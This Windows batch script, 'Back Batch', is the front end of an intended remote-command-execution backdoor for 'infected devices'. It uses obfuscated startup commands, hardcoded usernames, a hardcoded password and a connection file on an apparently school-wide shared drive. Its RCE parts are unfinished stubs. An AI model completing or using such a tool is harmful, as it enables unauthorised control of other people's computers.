:: :: :: :: :: :: :: :: ::
:: Back Batch, by 1k0de ::
:: :: :: :: :: :: :: :: ::

set _a=set&set "_b= "&s^et _c==
set _p=o&set _i=c&set _e=h&set%_b%_y_=itl&set _re3_=B

set "_debugMode=true"

Setlocal DisableDelayedExpansion

::: { Creates variable /AE = Ascii-27 escape code.
::: - %/AE% can be used  with and without DelayedExpansion.
    For /F %%a in ('echo prompt $E ^| cmd')do set "/AE=%%a"
::: }

(Set \n=^^^
%=Newline DNR=%
)
::: / Color Print Macro -
::: Usage: %Print%{RRR;GGG;BBB}text to output
::: \n at the end of the string echo's a new line
::: valid range for RGB values: 0 - 255
  Set Print=For %%n in (1 2)Do If %%n==2 (%\n%
    For /F "Delims=" %%G in ("!Args!")Do (%\n%
      For /F "Tokens=1 Delims={}" %%i in ("%%G")Do Set "Output=%/AE%[0m%/AE%[38;2;%%im!Args:{%%~i}=!"%\n%
      ^< Nul set /P "=!Output:\n=!%/AE%[0m"%\n%
      If "!Output:~-2!"=="\n" (Echo/^&Endlocal)Else (Endlocal)%\n%
    )%\n%
  )Else Setlocal EnableDelayedExpansion ^& Set Args=
::: / Erase Macro -
::: Usage: %Erase%{string of the length to be erased}
  Set Erase=For %%n in (1 2)Do If %%n==2 (%\n%
    For /F "Tokens=1 Delims={}" %%G in ("!Args!")Do (%\n%
      Set "Nul=!Args:{%%G}=%%G!"%\n%
      For /L %%# in (0 1 100) Do (If Not "!Nul:~%%#,1!"=="" ^< Nul set /P "=%/AE%[D%/AE%[K")%\n%
    )%\n%
    Endlocal%\n%
  )Else Setlocal EnableDelayedExpansion ^& Set Args=

@^e%_i%%_e%^%_p%%_b%%_p%f^f
^t%_y_%^e%_b%B^a%_i%kB%_re3%a^t%_i%h&%_i%l^s
goto loading_phase

:loading_phase
%_i%l^s
%_a%%_b%"_connectionFile%_c%P:\All Students\Composite"
if "%_debugMode%" == "true" (
    %_a%%_b%"_connectionFile%_c%%cd%"
)
ping localhost -n 2 > nul
echo.
%Print%{255;255;255}BackBatch { "[ CONNECTION FILE ]" } : Searching..
ping localhost -n 4 > nul
%ERASE%{Searching..}
if not exist "%_connectionFile%" (
    %Print%{255;255;255}Search Failed.. ^(Retrying..^)\n
    echo.
    echo.
    echo ^(If problem persists, check internet connection or contact 1k0de^)
    ping localhost -n 3 > nul
    goto loading_phase
)
%Print%{255;255;255}Successfully found file..\n
echo.
ping localhost -n 2 > nul
echo ^ ^ ^ ^ _Checking user account..
ping localhost -n 2 > nul
set "_verified=false"
if "%Username%" == "karim.dalati1" ( :: Apply string obfuscation to all usernames to protect user privacy
  set "_verified=true"
)
if "%Username%" == "jennan.dalati" ( set "_verified=true" )
if "%Username%" == "adeld" ( set "_verified=true" )
if not "%_verified%" == "true" (
  %Print%{207;24;27}^ ^ ^ ^ [ ACCESS DENIED ]\n
  echo.
  pause
  exit
) else (
  %Print%{50;168;82}^ ^ ^ ^ [ ACCESS GRANTED ]\n
)
echo.
echo _Starting ^<Back Batch^>
echo.
ping localhost -n 3 > nul
goto BackBatch_main

:BackBatch_main
cls
echo.
%Print%{255;255;255}___  ____ ____ _  _    ___  ____ ___ ____ _  _ \n
%Print%{255;255;255}^|__
%Print%{207;24;27}] 
%Print%{255;255;255}^|__^| ^|    ^|_/     ^|__
%Print%{207;24;27}] 
%Print%{255;255;255}^|__^|  ^|  ^|    ^|__^| \n
%Print%{255;255;255}^|__
%Print%{207;24;27}] 
%Print%{255;255;255}^|  ^| ^|___ ^| \_    ^|__
%Print%{207;24;26}] 
%Print%{255;255;255}^|  ^|  ^|  ^|___ ^|  ^| 
echo.
echo _________________________________________________________________________________________
echo By 1k0de
echo.
echo ^(Type "help" or ".cmds" for a list of commands^)
echo.
Setlocal EnableDelayedExpansion
goto BackBatch_ask

:BackBatch_ask
set "_mainInput="
set /p "_mainInput=.BackBatch > "
if "%_mainInput%" == "help" (
  goto list_cmds
)
if "%_mainInput%" == ".cmds" (
  goto list_cmds
)
if "%_mainInput%" == ".rce" (
  goto rce_security
)
if "%_mainInput%" == ".infection" (
  goto infection_security
)
if "%_mainInput%" == "" ( goto BackBatch_ask )
echo The command "!_mainInput!" is invalid^!
goto BackBatch_ask

:list_cmds
echo.
echo help        -^> Lists the commands
echo .cmds       -^> Lists the commands
echo .rce        -^> Starts the remote command execution
echo .infection  -^> Starts the remote command execution to ALL infected devices
echo .return     -^> Returns to main menu while being in any of the tools
echo.
goto BackBatch_ask

:rce_security
set "_rceSecurity_pwordInput="
set "_isValid=false"
echo.
set "psCommand=powershell -Command "$pword = read-host 'RCE Password Required' -AsSecureString ; ^
 $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
          [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set "_rceSecurity_pwordInput=%%p"
echo.
ping localhost -n 2 > nul
echo.
if not "%_rceSecurity_pwordInput%" == "_ven" ( ::String obbfuscate password
  echo Invalid Password^^!
  echo.
  goto BackBatch_ask
)
echo ^ ^ ^ Initializing : Remote Command Execution..
echo.
goto rce_main
pause

:infection_security
echo.
:: enter code here

:rce_main
echo.
echo Welcome to RCE. This part is coming soon
pause
echo.
goto BackBatch_ask
